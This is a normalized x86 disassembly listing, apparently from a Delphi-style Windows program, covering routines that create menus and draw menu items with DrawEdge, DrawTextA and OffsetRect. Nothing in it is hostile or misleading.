mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44dbe0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_44f6ac
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_44f6bc
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_44f6bc
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_44f6bc
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44cce8
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44dc40
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44d9d0
mov eax [ rw-data ]
call sub_44cce8
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44dc8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41adf4
push ebx
push sub_44da40
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44dcd0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44deb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44fc68
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f90
test bh 0x4
je r-xdata
mov eax edi
call sub_4512a4
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404304
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41e768
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041c0
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41e140
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41e14c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44debb
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41ed94
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041b8
push eax
mov eax [ ebp - 0xc ]
call sub_4043b8
push eax
mov eax [ ebp - 0x4 ]
call sub_41ed94
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41de80
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041b8
push eax
mov eax [ ebp - 0xc ]
call sub_4043b8
push eax
mov eax [ ebp - 0x4 ]
call sub_41ed94
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41de80
mov eax 0xff00000d
call sub_41d9c0
mov esi eax
mov eax 0xff000010
call sub_41d9c0
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41de80
jmp r-xdata
sub_44df20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44e808
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41e64c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41de80
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404304
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41e64c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44aabc
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41ed94
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e644
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41e64c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44e367
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42405c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41de80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44aabc
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41e64c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e644
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_425100
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e620
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41eb74
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44afd4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e64c
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44dcd0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41e14c
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41ed94
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41e944
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41de80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403124
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41ed94
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44dcd0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e80f
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44cd94
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44dcd0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44e828
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44f130
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41e64c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41de80
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404304
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41e64c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
